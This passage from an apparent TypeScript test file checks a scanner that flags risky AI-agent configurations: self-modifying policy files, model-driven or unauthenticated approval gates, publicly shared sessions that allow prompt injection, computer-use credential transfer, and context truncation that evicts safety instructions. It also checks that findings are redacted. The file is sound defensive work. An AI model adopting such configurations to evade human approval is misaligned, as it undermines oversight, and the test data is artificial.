    expect(runtimeAgentExtensionAutoUpdateFindings[0]?.matched_object.metadata.agent_extension_loader_extension_kinds).toEqual([
      "plugin",
      "skill"
    ]);
    expect(runtimeAgentExtensionAutoUpdateFindings[0]?.matched_object.metadata.agent_extension_loader_tool_authority_categories).toEqual([
      "browser_action",
      "database_access",
      "external_response",
      "memory_write",
      "repo_or_filesystem_write",
      "secret_manager_access"
    ]);
    expect(runtimeAgentExtensionAutoUpdateFindings[0]?.severity).toBe("critical");
    expect(runtimeAgentExtensionAutoUpdateFindings[0]?.confidence).toBe("very_high");
    expect(runtimeAgentExtensionAutoUpdateFindings[0]?.recommended_control).toBe("quarantine");
    expect(JSON.stringify(runtimeAgentExtensionAutoUpdateFindings[0])).not.toContain("${AGENT_EXTENSION_TOKEN}");
    expect(JSON.stringify(runtimeAgentExtensionAutoUpdateFindings[0])).not.toContain("skills.agentcsp-demo.example.invalid");
    expect(JSON.stringify(runtimeAgentExtensionAutoUpdateFindings[0])).not.toContain("browser-account-actions");
    expect(JSON.stringify(runtimeAgentExtensionAutoUpdateFindings[0])).not.toContain("@agentcsp-demo/browser-account-actions");
    expect(JSON.stringify(runtimeAgentExtensionAutoUpdateFindings[0])).not.toContain("customer-data-plugin");
    expect(JSON.stringify(runtimeAgentExtensionAutoUpdateFindings[0])).not.toContain("github.com/agentcsp-demo/customer-data-plugin");
    expect(JSON.stringify(runtimeAgentExtensionAutoUpdateFindings[0])).not.toContain("browser.submit_customer_form");
    expect(JSON.stringify(runtimeAgentExtensionAutoUpdateFindings[0])).not.toContain("slack.post_escalation_reply");
    expect(JSON.stringify(runtimeAgentExtensionAutoUpdateFindings[0])).not.toContain("support_db.update_customer_record");
    expect(JSON.stringify(runtimeAgentExtensionAutoUpdateFindings[0])).not.toContain("memory.write_long_term_summary");
    expect(JSON.stringify(runtimeAgentExtensionAutoUpdateFindings[0])).not.toContain("vault_secret_lookup.read_support_token");
    expect(JSON.stringify(runtimeAgentExtensionAutoUpdateFindings[0])).not.toContain("filesystem.write_customer_export");
    expect(JSON.stringify(runtimeAgentExtensionAutoUpdateFindings[0])).not.toContain("untrusted_customer_message");
    expect(JSON.stringify(runtimeAgentExtensionAutoUpdateFindings[0])).not.toContain("retrieved_customer_context");
    expect(JSON.stringify(runtimeAgentExtensionAutoUpdateFindings[0])).not.toContain("browser_tool_output");
    expect(JSON.stringify(runtimeAgentExtensionAutoUpdateFindings[0])).not.toContain("customer_requested_skill");
    expect(JSON.stringify(runtimeAgentExtensionAutoUpdateFindings[0])).not.toContain("customer_extension_email");
    expect(JSON.stringify(runtimeAgentExtensionAutoUpdateFindings[0])).not.toContain("customer_account_number");
    expect(JSON.stringify(runtimeAgentExtensionAutoUpdateFindings[0])).not.toContain("confidential_extension_payload");
    const runtimeSelfModificationFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-020");
    expect(runtimeSelfModificationFindings).toHaveLength(1);
    expect(runtimeSelfModificationFindings[0]?.matched_object.path).toBe("self-modification/policy-writer.yaml");
    expect(runtimeSelfModificationFindings[0]?.matched_object.metadata).toMatchObject({
      parsed_agent_self_modification_config: true,
      agent_self_modification_write_enabled: true,
      agent_self_modification_auto_apply: true,
      agent_self_modification_persistent_change: true,
      agent_self_modification_untrusted_input: true,
      agent_self_modification_instruction_target: true,
      agent_self_modification_policy_target: true,
      agent_self_modification_tool_target: true,
      agent_self_modification_approval_required: false
    });
    expect(runtimeSelfModificationFindings[0]?.matched_object.metadata.agent_self_modification_target_categories).toEqual([
      "instruction_file",
      "memory_store",
      "policy_file",
      "prompt_template",
      "runtime_config",
      "tool_definition"
    ]);
    expect(runtimeSelfModificationFindings[0]?.severity).toBe("critical");
    expect(runtimeSelfModificationFindings[0]?.confidence).toBe("very_high");
    expect(runtimeSelfModificationFindings[0]?.recommended_control).toBe("quarantine");
    expect(JSON.stringify(runtimeSelfModificationFindings[0])).not.toContain("${AGENT_SELF_MOD_TOKEN}");
    expect(JSON.stringify(runtimeSelfModificationFindings[0])).not.toContain("AGENTS.md");
    expect(JSON.stringify(runtimeSelfModificationFindings[0])).not.toContain("support-ticket.prompt.md");
    expect(JSON.stringify(runtimeSelfModificationFindings[0])).not.toContain("agentcsp.yaml");
    expect(JSON.stringify(runtimeSelfModificationFindings[0])).not.toContain("system_prompt");
    expect(JSON.stringify(runtimeSelfModificationFindings[0])).not.toContain("npm run agent:run");
    const runtimeSelfModificationPersistenceFindings = findings.filter(
      (finding) => finding.rule_id === "AGENTCSP-RUNTIME-077"
    );
    expect(runtimeSelfModificationPersistenceFindings).toHaveLength(1);
    expect(runtimeSelfModificationPersistenceFindings[0]?.matched_object.path).toBe(
      "self-modification/policy-writer.yaml"
    );
    expect(runtimeSelfModificationPersistenceFindings[0]?.matched_object.metadata).toMatchObject({
      parsed_agent_self_modification_config: true,
      agent_self_modification_write_enabled: true,
      agent_self_modification_auto_apply: true,
      agent_self_modification_persistent_change: true,
      agent_self_modification_executes_after_update: true,
      agent_self_modification_rollback_enabled: false,
      agent_self_modification_untrusted_input: true,
      agent_self_modification_policy_target: true,
      agent_self_modification_runtime_target: true,
      agent_self_modification_tool_target: true,
      agent_self_modification_approval_required: false
    });
    expect(
      runtimeSelfModificationPersistenceFindings[0]?.matched_object.metadata
        .agent_self_modification_authority_categories
    ).toEqual([
      "control_plane_write",
      "external_response",
      "memory_write",
      "repo_or_filesystem_write",
      "shell_execution",
      "tool_definition_write"
    ]);
    expect(runtimeSelfModificationPersistenceFindings[0]?.severity).toBe("critical");
    expect(runtimeSelfModificationPersistenceFindings[0]?.confidence).toBe("very_high");
    expect(runtimeSelfModificationPersistenceFindings[0]?.recommended_control).toBe("quarantine");
    expect(JSON.stringify(runtimeSelfModificationPersistenceFindings[0])).not.toContain("${AGENT_SELF_MOD_TOKEN}");
    expect(JSON.stringify(runtimeSelfModificationPersistenceFindings[0])).not.toContain("AGENTS.md");
    expect(JSON.stringify(runtimeSelfModificationPersistenceFindings[0])).not.toContain("support-ticket.prompt.md");
    expect(JSON.stringify(runtimeSelfModificationPersistenceFindings[0])).not.toContain("agentcsp.yaml");
    expect(JSON.stringify(runtimeSelfModificationPersistenceFindings[0])).not.toContain(".codex/config.toml");
    expect(JSON.stringify(runtimeSelfModificationPersistenceFindings[0])).not.toContain("tools/agent-tools.json");
    expect(JSON.stringify(runtimeSelfModificationPersistenceFindings[0])).not.toContain("memory/release-notes.md");
    expect(JSON.stringify(runtimeSelfModificationPersistenceFindings[0])).not.toContain("approval_policy");
    expect(JSON.stringify(runtimeSelfModificationPersistenceFindings[0])).not.toContain("npm run agent:run");
    expect(JSON.stringify(runtimeSelfModificationPersistenceFindings[0])).not.toContain(
      "slack.post_escalation_reply"
    );
    expect(JSON.stringify(runtimeSelfModificationPersistenceFindings[0])).not.toContain("untrusted_customer_message");
    expect(JSON.stringify(runtimeSelfModificationPersistenceFindings[0])).not.toContain("retrieved_customer_context");
    expect(JSON.stringify(runtimeSelfModificationPersistenceFindings[0])).not.toContain("browser_tool_output");
    expect(JSON.stringify(runtimeSelfModificationPersistenceFindings[0])).not.toContain("customer_self_mod_email");
    expect(JSON.stringify(runtimeSelfModificationPersistenceFindings[0])).not.toContain(
      "confidential_policy_context"
    );
    const runtimeApprovalGateFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-021");
    expect(runtimeApprovalGateFindings).toHaveLength(1);
    expect(runtimeApprovalGateFindings[0]?.matched_object.path).toBe("approvals/model-reviewer.yaml");
    expect(runtimeApprovalGateFindings[0]?.matched_object.metadata).toMatchObject({
      parsed_agent_approval_config: true,
      agent_approval_context_untrusted: true,
      agent_approval_decision_model_driven: true,
      agent_approval_uses_untrusted_summary: true,
      agent_approval_privileged_actions: true,
      agent_approval_auto_execute_after_approval: true,
      agent_approval_human_required: false,
      agent_approval_default_allow: true,
      agent_approval_secret_access: true
    });
    expect(runtimeApprovalGateFindings[0]?.matched_object.metadata.agent_approval_action_categories).toEqual([
      "browser_action",
      "database_write",
      "external_response",
      "memory_write",
      "secret_manager_access",
      "tool_call"
    ]);
    expect(runtimeApprovalGateFindings[0]?.severity).toBe("critical");
    expect(runtimeApprovalGateFindings[0]?.confidence).toBe("very_high");
    expect(runtimeApprovalGateFindings[0]?.recommended_control).toBe("require_approval");
    expect(JSON.stringify(runtimeApprovalGateFindings[0])).not.toContain("${APPROVAL_GATE_TOKEN}");
    expect(JSON.stringify(runtimeApprovalGateFindings[0])).not.toContain("support-approval-classifier");
    expect(JSON.stringify(runtimeApprovalGateFindings[0])).not.toContain("Summarize the customer request");
    expect(JSON.stringify(runtimeApprovalGateFindings[0])).not.toContain("support_db.update_customer_record");
    expect(JSON.stringify(runtimeApprovalGateFindings[0])).not.toContain("customer_email_address");
    const runtimeModelApprovalBridgeFindings = findings.filter(
      (finding) => finding.rule_id === "AGENTCSP-RUNTIME-090"
    );
    expect(runtimeModelApprovalBridgeFindings).toHaveLength(1);
    expect(runtimeModelApprovalBridgeFindings[0]?.matched_object.path).toBe("approvals/model-reviewer.yaml");
    expect(runtimeModelApprovalBridgeFindings[0]?.matched_object.metadata).toMatchObject({
      parsed_agent_approval_config: true,
      agent_approval_context_untrusted: true,
      agent_approval_raw_context_included: true,
      agent_approval_decision_model_driven: true,
      agent_approval_uses_untrusted_summary: true,
      agent_approval_human_required: false,
      agent_approval_default_allow: true,
      agent_approval_auto_execute_after_approval: true,
      agent_approval_privileged_actions: true,
      agent_approval_write_actions: true,
      agent_approval_external_actions: true,
      agent_approval_memory_write: true,
      agent_approval_secret_access: true,
      agent_approval_sensitive_data: true,
      agent_approval_pii_data: true
    });
    expect(runtimeModelApprovalBridgeFindings[0]?.matched_object.metadata.agent_approval_prompt_source_categories).toEqual(
      ["memory_context", "retrieval_context", "tool_output", "untrusted_user_input"]
    );
    expect(runtimeModelApprovalBridgeFindings[0]?.matched_object.metadata.agent_approval_action_categories).toEqual([
      "browser_action",
      "database_write",
      "external_response",
      "memory_write",
      "secret_manager_access",
      "tool_call"
    ]);
    expect(runtimeModelApprovalBridgeFindings[0]?.severity).toBe("critical");
    expect(runtimeModelApprovalBridgeFindings[0]?.confidence).toBe("very_high");
    expect(runtimeModelApprovalBridgeFindings[0]?.recommended_control).toBe("require_approval");
    expect(JSON.stringify(runtimeModelApprovalBridgeFindings[0])).not.toContain("${APPROVAL_GATE_TOKEN}");
    expect(JSON.stringify(runtimeModelApprovalBridgeFindings[0])).not.toContain("support-approval-classifier");
    expect(JSON.stringify(runtimeModelApprovalBridgeFindings[0])).not.toContain("Summarize the customer request");
    expect(JSON.stringify(runtimeModelApprovalBridgeFindings[0])).not.toContain("approve_and_execute");
    expect(JSON.stringify(runtimeModelApprovalBridgeFindings[0])).not.toContain("customer_ticket_message");
    expect(JSON.stringify(runtimeModelApprovalBridgeFindings[0])).not.toContain("retrieved_account_context");
    expect(JSON.stringify(runtimeModelApprovalBridgeFindings[0])).not.toContain("browser_tool_output");
    expect(JSON.stringify(runtimeModelApprovalBridgeFindings[0])).not.toContain("support_db.update_customer_record");
    expect(JSON.stringify(runtimeModelApprovalBridgeFindings[0])).not.toContain("vault_secret_lookup.read_support_token");
    expect(JSON.stringify(runtimeModelApprovalBridgeFindings[0])).not.toContain("browser.submit_customer_form");
    expect(JSON.stringify(runtimeModelApprovalBridgeFindings[0])).not.toContain("memory.write_long_term_summary");
    expect(JSON.stringify(runtimeModelApprovalBridgeFindings[0])).not.toContain("customer_email_address");
    expect(JSON.stringify(runtimeModelApprovalBridgeFindings[0])).not.toContain("customer_account_number");
    expect(JSON.stringify(runtimeModelApprovalBridgeFindings[0])).not.toContain("confidential_support_notes");
    const runtimeApprovalChannelFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-052");
    expect(runtimeApprovalChannelFindings).toHaveLength(1);
    expect(runtimeApprovalChannelFindings[0]?.matched_object.path).toBe("approvals/chatops-approval.yaml");
    expect(runtimeApprovalChannelFindings[0]?.matched_object.metadata).toMatchObject({
      parsed_agent_approval_config: true,
      agent_approval_human_required: true,
      agent_approval_external_channel: true,
      agent_approval_channel_auth_disabled: true,
      agent_approval_approver_identity_unverified: true,
      agent_approval_replay_protection_disabled: true,
      agent_approval_broad_approver_scope: true,
      agent_approval_context_untrusted: true,
      agent_approval_raw_context_included: true,
      agent_approval_privileged_actions: true,
      agent_approval_auto_execute_after_approval: true
    });
    expect(runtimeApprovalChannelFindings[0]?.matched_object.metadata.agent_approval_channel_categories).toEqual([
      "chatops",
      "webhook"
    ]);
    expect(runtimeApprovalChannelFindings[0]?.severity).toBe("critical");
    expect(runtimeApprovalChannelFindings[0]?.confidence).toBe("very_high");
    expect(runtimeApprovalChannelFindings[0]?.recommended_control).toBe("deny");
    expect(JSON.stringify(runtimeApprovalChannelFindings[0])).not.toContain("${CHATOPS_APPROVAL_TOKEN}");
    expect(JSON.stringify(runtimeApprovalChannelFindings[0])).not.toContain("hooks.slack.example.invalid");
    expect(JSON.stringify(runtimeApprovalChannelFindings[0])).not.toContain("#customer-support");
    expect(JSON.stringify(runtimeApprovalChannelFindings[0])).not.toContain("support_db.update_customer_record");
    expect(JSON.stringify(runtimeApprovalChannelFindings[0])).not.toContain("chatops_approval_customer_email");
    const runtimeApprovalRawContextFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-078");
    expect(runtimeApprovalRawContextFindings).toHaveLength(1);
    expect(runtimeApprovalRawContextFindings[0]?.matched_object.path).toBe("approvals/chatops-approval.yaml");
    expect(runtimeApprovalRawContextFindings[0]?.matched_object.metadata).toMatchObject({
      parsed_agent_approval_config: true,
      agent_approval_human_required: true,
      agent_approval_external_channel: true,
      agent_approval_context_untrusted: true,
      agent_approval_raw_context_included: true,
      agent_approval_auto_execute_after_approval: true,
      agent_approval_privileged_actions: true,
      agent_approval_write_actions: true,
      agent_approval_external_actions: true,
      agent_approval_secret_access: true
    });
    expect(runtimeApprovalRawContextFindings[0]?.matched_object.metadata.agent_approval_prompt_source_categories).toEqual([
      "retrieval_context",
      "tool_output",
      "untrusted_user_input"
    ]);
    expect(runtimeApprovalRawContextFindings[0]?.matched_object.metadata.agent_approval_action_categories).toEqual([
      "browser_action",
      "database_write",
      "external_response",
      "secret_manager_access",
      "tool_call"
    ]);
    expect(runtimeApprovalRawContextFindings[0]?.severity).toBe("critical");
    expect(runtimeApprovalRawContextFindings[0]?.confidence).toBe("very_high");
    expect(runtimeApprovalRawContextFindings[0]?.recommended_control).toBe("require_approval");
    expect(JSON.stringify(runtimeApprovalRawContextFindings[0])).not.toContain("${CHATOPS_APPROVAL_TOKEN}");
    expect(JSON.stringify(runtimeApprovalRawContextFindings[0])).not.toContain("hooks.slack.example.invalid");
    expect(JSON.stringify(runtimeApprovalRawContextFindings[0])).not.toContain("#customer-support");
    expect(JSON.stringify(runtimeApprovalRawContextFindings[0])).not.toContain("/approve");
    expect(JSON.stringify(runtimeApprovalRawContextFindings[0])).not.toContain("customer_ticket_message");
    expect(JSON.stringify(runtimeApprovalRawContextFindings[0])).not.toContain("retrieved_account_context");
    expect(JSON.stringify(runtimeApprovalRawContextFindings[0])).not.toContain("browser_tool_output");
    expect(JSON.stringify(runtimeApprovalRawContextFindings[0])).not.toContain("support_db.update_customer_record");
    expect(JSON.stringify(runtimeApprovalRawContextFindings[0])).not.toContain("vault_secret_lookup.read_support_token");
    expect(JSON.stringify(runtimeApprovalRawContextFindings[0])).not.toContain("browser.submit_customer_form");
    expect(JSON.stringify(runtimeApprovalRawContextFindings[0])).not.toContain("chatops_approval_customer_email");
    expect(JSON.stringify(runtimeApprovalRawContextFindings[0])).not.toContain("chatops_approval_account_number");
    expect(JSON.stringify(runtimeApprovalRawContextFindings[0])).not.toContain("confidential_chatops_approval_notes");
    const runtimeSharedSessionFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-053");
    expect(runtimeSharedSessionFindings).toHaveLength(1);
    expect(runtimeSharedSessionFindings[0]?.matched_object.path).toBe("sessions/shared-copilot.yaml");
    expect(runtimeSharedSessionFindings[0]?.matched_object.metadata).toMatchObject({
      parsed_agent_session_sharing_config: true,
      agent_session_sharing_enabled: true,
      agent_session_sharing_external: true,
      agent_session_sharing_public_access: true,
      agent_session_sharing_anonymous_access: true,
      agent_session_sharing_auth_disabled: true,
      agent_session_sharing_live_control_enabled: true,
      agent_session_sharing_prompt_injection_enabled: true,
      agent_session_sharing_tool_control_enabled: true,
      agent_session_sharing_approval_control_enabled: true,
      agent_session_sharing_sensitive_context: true,
      agent_session_sharing_secret_capture: true,
      agent_session_sharing_redaction_disabled: true,
      agent_session_sharing_approval_required: false
    });
    expect(runtimeSharedSessionFindings[0]?.matched_object.metadata.agent_session_sharing_control_categories).toEqual([
      "approval_control",
      "database_write",
      "live_control",
      "prompt_injection",
      "resume_replay",
      "secret_manager_access",
      "tool_call"
    ]);
    expect(runtimeSharedSessionFindings[0]?.severity).toBe("critical");
    expect(runtimeSharedSessionFindings[0]?.confidence).toBe("very_high");
    expect(runtimeSharedSessionFindings[0]?.recommended_control).toBe("deny");
    expect(JSON.stringify(runtimeSharedSessionFindings[0])).not.toContain("${SESSION_SHARE_TOKEN}");
    expect(JSON.stringify(runtimeSharedSessionFindings[0])).not.toContain("sessions.agentcsp-demo.example.invalid");
    expect(JSON.stringify(runtimeSharedSessionFindings[0])).not.toContain("customer-support-live-share");
    expect(JSON.stringify(runtimeSharedSessionFindings[0])).not.toContain("external_support_vendor");
    expect(JSON.stringify(runtimeSharedSessionFindings[0])).not.toContain("support_db.update_customer_record");
    expect(JSON.stringify(runtimeSharedSessionFindings[0])).not.toContain("session_share_customer_email");
    const runtimePublicSharedSessionFindings = findings.filter(
      (finding) => finding.rule_id === "AGENTCSP-RUNTIME-106"
    );
    expect(runtimePublicSharedSessionFindings).toHaveLength(1);
    expect(runtimePublicSharedSessionFindings[0]?.matched_object.path).toBe("sessions/shared-copilot.yaml");
    expect(runtimePublicSharedSessionFindings[0]?.matched_object.metadata).toMatchObject({
      parsed_agent_session_sharing_config: true,
      agent_session_sharing_enabled: true,
      agent_session_sharing_external: true,
      agent_session_sharing_public_access: true,
      agent_session_sharing_anonymous_access: true,
      agent_session_sharing_auth_disabled: true,
      agent_session_sharing_external_collaborators: true,
      agent_session_sharing_broad_collaborator_scope: true,
      agent_session_sharing_live_control_enabled: true,
      agent_session_sharing_prompt_injection_enabled: true,
      agent_session_sharing_tool_control_enabled: true,
      agent_session_sharing_tool_write_authority: true,
      agent_session_sharing_approval_control_enabled: true,
      agent_session_sharing_resume_replay_enabled: true,
      agent_session_sharing_transcript_capture: true,
      agent_session_sharing_sensitive_context: true,
      agent_session_sharing_pii_context: true,
      agent_session_sharing_secret_capture: true,
      agent_session_sharing_redaction_disabled: true,
      agent_session_sharing_untrusted_input: true,
      agent_session_sharing_approval_required: false
    });
    expect(runtimePublicSharedSessionFindings[0]?.matched_object.metadata.agent_session_sharing_control_categories).toEqual([
      "approval_control",
      "database_write",
      "live_control",
      "prompt_injection",
      "resume_replay",
      "secret_manager_access",
      "tool_call"
    ]);
    expect(runtimePublicSharedSessionFindings[0]?.matched_object.metadata.agent_session_sharing_capture_categories).toEqual([
      "browser_context",
      "completion_context",
      "memory_context",
      "prompt_context",
      "retrieval_context",
      "secret_context",
      "tool_output",
      "transcript"
    ]);
    expect(runtimePublicSharedSessionFindings[0]?.matched_object.data_classes).toContain("credential");
    expect(runtimePublicSharedSessionFindings[0]?.matched_object.secret_exposure).toBe(true);
    expect(runtimePublicSharedSessionFindings[0]?.matched_object.untrusted_to_privileged).toBe(true);
    expect(runtimePublicSharedSessionFindings[0]?.severity).toBe("critical");
    expect(runtimePublicSharedSessionFindings[0]?.confidence).toBe("very_high");
    expect(runtimePublicSharedSessionFindings[0]?.recommended_control).toBe("quarantine");
    expect(JSON.stringify(runtimePublicSharedSessionFindings[0])).not.toContain("${SESSION_SHARE_TOKEN}");
    expect(JSON.stringify(runtimePublicSharedSessionFindings[0])).not.toContain("sessions.agentcsp-demo.example.invalid");
    expect(JSON.stringify(runtimePublicSharedSessionFindings[0])).not.toContain("customer-support-live-share");
    expect(JSON.stringify(runtimePublicSharedSessionFindings[0])).not.toContain("external_support_vendor");
    expect(JSON.stringify(runtimePublicSharedSessionFindings[0])).not.toContain("untrusted_customer_ticket");
    expect(JSON.stringify(runtimePublicSharedSessionFindings[0])).not.toContain("browser_tool_output");
    expect(JSON.stringify(runtimePublicSharedSessionFindings[0])).not.toContain("support_db.update_customer_record");
    expect(JSON.stringify(runtimePublicSharedSessionFindings[0])).not.toContain(
      "vault_secret_lookup.read_support_token"
    );
    expect(JSON.stringify(runtimePublicSharedSessionFindings[0])).not.toContain("session_share_customer_email");
    expect(JSON.stringify(runtimePublicSharedSessionFindings[0])).not.toContain("session_share_account_number");
    expect(JSON.stringify(runtimePublicSharedSessionFindings[0])).not.toContain("confidential_session_share_notes");
    const runtimeComputerUseFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-054");
    expect(runtimeComputerUseFindings).toHaveLength(1);
    expect(runtimeComputerUseFindings[0]?.matched_object.path).toBe("computer/desktop-agent.yaml");
    expect(runtimeComputerUseFindings[0]?.matched_object.metadata).toMatchObject({
      parsed_agent_computer_use_config: true,
      agent_computer_use_enabled: true,
      agent_computer_use_authenticated_session: true,
      agent_computer_use_screen_capture: true,
      agent_computer_use_keyboard_input: true,
      agent_computer_use_mouse_control: true,
      agent_computer_use_clipboard_access: true,
      agent_computer_use_file_transfer: true,
      agent_computer_use_untrusted_input: true,
      agent_computer_use_redaction_disabled: true,
      agent_computer_use_approval_required: false
    });
    expect(runtimeComputerUseFindings[0]?.severity).toBe("critical");
    expect(runtimeComputerUseFindings[0]?.confidence).toBe("very_high");
    expect(runtimeComputerUseFindings[0]?.recommended_control).toBe("require_approval");
    expect(JSON.stringify(runtimeComputerUseFindings[0])).not.toContain("${DESKTOP_AGENT_TOKEN}");
    expect(JSON.stringify(runtimeComputerUseFindings[0])).not.toContain("desktop.agentcsp-demo.example.invalid");
    expect(JSON.stringify(runtimeComputerUseFindings[0])).not.toContain("support-crm-admin");
    expect(JSON.stringify(runtimeComputerUseFindings[0])).not.toContain("desktop_customer_email");
    const runtimeComputerUseCredentialTransferFindings = findings.filter(
      (finding) => finding.rule_id === "AGENTCSP-RUNTIME-099"
    );
    expect(runtimeComputerUseCredentialTransferFindings).toHaveLength(1);
    expect(runtimeComputerUseCredentialTransferFindings[0]?.matched_object.path).toBe("computer/desktop-agent.yaml");
    expect(runtimeComputerUseCredentialTransferFindings[0]?.matched_object.metadata).toMatchObject({
      parsed_agent_computer_use_config: true,
      agent_computer_use_enabled: true,
      agent_computer_use_remote_session: true,
      agent_computer_use_authenticated_session: true,
      agent_computer_use_credential_store_access: true,
      agent_computer_use_screen_capture: true,
      agent_computer_use_ocr_capture: true,
      agent_computer_use_clipboard_write: true,
      agent_computer_use_file_transfer: true,
      agent_computer_use_download_auto_accept: true,
      agent_computer_use_local_path_redacted: true,
      agent_computer_use_untrusted_input: true,
      agent_computer_use_sensitive_context: true,
      agent_computer_use_pii_context: true,
      agent_computer_use_redaction_disabled: true,
      agent_computer_use_approval_required: false
    });
    expect(runtimeComputerUseCredentialTransferFindings[0]?.matched_object.data_classes).toContain("credential");
    expect(runtimeComputerUseCredentialTransferFindings[0]?.matched_object.secret_exposure).toBe(true);
    expect(runtimeComputerUseCredentialTransferFindings[0]?.matched_object.untrusted_to_privileged).toBe(true);
    expect(runtimeComputerUseCredentialTransferFindings[0]?.severity).toBe("critical");
    expect(runtimeComputerUseCredentialTransferFindings[0]?.confidence).toBe("very_high");
    expect(runtimeComputerUseCredentialTransferFindings[0]?.recommended_control).toBe("quarantine");
    expect(JSON.stringify(runtimeComputerUseCredentialTransferFindings[0])).not.toContain("${DESKTOP_AGENT_TOKEN}");
    expect(JSON.stringify(runtimeComputerUseCredentialTransferFindings[0])).not.toContain("desktop.agentcsp-demo.example.invalid");
    expect(JSON.stringify(runtimeComputerUseCredentialTransferFindings[0])).not.toContain("support-crm-admin");
    expect(JSON.stringify(runtimeComputerUseCredentialTransferFindings[0])).not.toContain("billing-console-prod");
    expect(JSON.stringify(runtimeComputerUseCredentialTransferFindings[0])).not.toContain("password-manager-desktop");
    expect(JSON.stringify(runtimeComputerUseCredentialTransferFindings[0])).not.toContain("customer-crm-window");
    expect(JSON.stringify(runtimeComputerUseCredentialTransferFindings[0])).not.toContain("billing-admin-window");
    expect(JSON.stringify(runtimeComputerUseCredentialTransferFindings[0])).not.toContain("/Users/support/customer_exports/export.csv");
    expect(JSON.stringify(runtimeComputerUseCredentialTransferFindings[0])).not.toContain("/tmp/agent-desktop-downloads");
    expect(JSON.stringify(runtimeComputerUseCredentialTransferFindings[0])).not.toContain("untrusted_customer_ticket");
    expect(JSON.stringify(runtimeComputerUseCredentialTransferFindings[0])).not.toContain("browser_tool_output");
    expect(JSON.stringify(runtimeComputerUseCredentialTransferFindings[0])).not.toContain("desktop_customer_email");
    expect(JSON.stringify(runtimeComputerUseCredentialTransferFindings[0])).not.toContain("desktop_account_number");
    expect(JSON.stringify(runtimeComputerUseCredentialTransferFindings[0])).not.toContain("confidential_desktop_notes");
    const runtimeContextWindowFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-055");
    expect(runtimeContextWindowFindings).toHaveLength(1);
    expect(runtimeContextWindowFindings[0]?.matched_object.path).toBe("context-window/truncation-policy.yaml");
    expect(runtimeContextWindowFindings[0]?.matched_object.metadata).toMatchObject({
      parsed_agent_context_window_config: true,
      agent_context_window_enabled: true,
      agent_context_window_truncation_enabled: true,
      agent_context_window_untrusted_priority: true,
      agent_context_window_privileged_instruction_eviction: true,
      agent_context_window_safety_instruction_eviction: true,
      agent_context_window_privileged_tool_authority: true,
      agent_context_window_summary_verification_disabled: true,
      agent_context_window_approval_required: false
    });
    expect(runtimeContextWindowFindings[0]?.matched_object.metadata.agent_context_window_tool_authority_categories).toEqual([
      "database_write",
      "external_response",
      "secret_manager_access",
      "tool_call"
    ]);
    expect(runtimeContextWindowFindings[0]?.severity).toBe("critical");
    expect(runtimeContextWindowFindings[0]?.confidence).toBe("very_high");
    expect(runtimeContextWindowFindings[0]?.recommended_control).toBe("require_approval");
    expect(JSON.stringify(runtimeContextWindowFindings[0])).not.toContain("${CONTEXT_WINDOW_TOKEN}");
    expect(JSON.stringify(runtimeContextWindowFindings[0])).not.toContain("sliding_window_with_summary");
    expect(JSON.stringify(runtimeContextWindowFindings[0])).not.toContain("untrusted_customer_ticket");
    expect(JSON.stringify(runtimeContextWindowFindings[0])).not.toContain("browser_tool_output");
    expect(JSON.stringify(runtimeContextWindowFindings[0])).not.toContain("retrieved_customer_context");
    expect(JSON.stringify(runtimeContextWindowFindings[0])).not.toContain("long_term_memory");
    expect(JSON.stringify(runtimeContextWindowFindings[0])).not.toContain("system_prompt");
    expect(JSON.stringify(runtimeContextWindowFindings[0])).not.toContain("developer_instructions");
    expect(JSON.stringify(runtimeContextWindowFindings[0])).not.toContain("support_db.update_customer_record");
    expect(JSON.stringify(runtimeContextWindowFindings[0])).not.toContain("slack.post_customer_reply");
    expect(JSON.stringify(runtimeContextWindowFindings[0])).not.toContain("context_window_customer_email");
    const runtimeContextWindowSummaryFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-071");
    expect(runtimeContextWindowSummaryFindings).toHaveLength(1);
    expect(runtimeContextWindowSummaryFindings[0]?.matched_object.path).toBe("context-window/truncation-policy.yaml");
    expect(runtimeContextWindowSummaryFindings[0]?.matched_object.metadata).toMatchObject({
      parsed_agent_context_window_config: true,
      agent_context_window_summarization_enabled: true,
      agent_context_window_summary_untrusted: true,
      agent_context_window_summary_verification_disabled: true,
      agent_context_window_delimiter_disabled: true,
      agent_context_window_redaction_disabled: true,
      agent_context_window_memory_replay: true,
      agent_context_window_privileged_tool_authority: true,
      agent_context_window_approval_required: false
    });
    expect(runtimeContextWindowSummaryFindings[0]?.matched_object.metadata.agent_context_window_priority_categories).toEqual([
      "developer_instruction",
      "memory_context",
      "retrieval_context",
      "safety_policy",
      "summary_context",
      "system_instruction",
      "tool_output",
      "untrusted_user_input"
    ]);
    expect(runtimeContextWindowSummaryFindings[0]?.severity).toBe("critical");
    expect(runtimeContextWindowSummaryFindings[0]?.confidence).toBe("very_high");
    expect(runtimeContextWindowSummaryFindings[0]?.recommended_control).toBe("redact");
    expect(JSON.stringify(runtimeContextWindowSummaryFindings[0])).not.toContain("${CONTEXT_WINDOW_TOKEN}");
    expect(JSON.stringify(runtimeContextWindowSummaryFindings[0])).not.toContain("sliding_window_with_summary");
    expect(JSON.stringify(runtimeContextWindowSummaryFindings[0])).not.toContain("untrusted_customer_ticket");
    expect(JSON.stringify(runtimeContextWindowSummaryFindings[0])).not.toContain("browser_tool_output");
    expect(JSON.stringify(runtimeContextWindowSummaryFindings[0])).not.toContain("retrieved_customer_context");
    expect(JSON.stringify(runtimeContextWindowSummaryFindings[0])).not.toContain("long_term_memory");
    expect(JSON.stringify(runtimeContextWindowSummaryFindings[0])).not.toContain("context_window_customer_email");
    const runtimeToolRetryFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-056");
    expect(runtimeToolRetryFindings).toHaveLength(1);
    expect(runtimeToolRetryFindings[0]?.matched_object.path).toBe("tool-retry/retry-policy.yaml");
    expect(runtimeToolRetryFindings[0]?.matched_object.metadata).toMatchObject({
      parsed_agent_tool_retry_policy_config: true,
      agent_tool_retry_enabled: true,
      agent_tool_retry_automatic_retry: true,
      agent_tool_retry_replay_enabled: true,
      agent_tool_retry_untrusted_input: true,
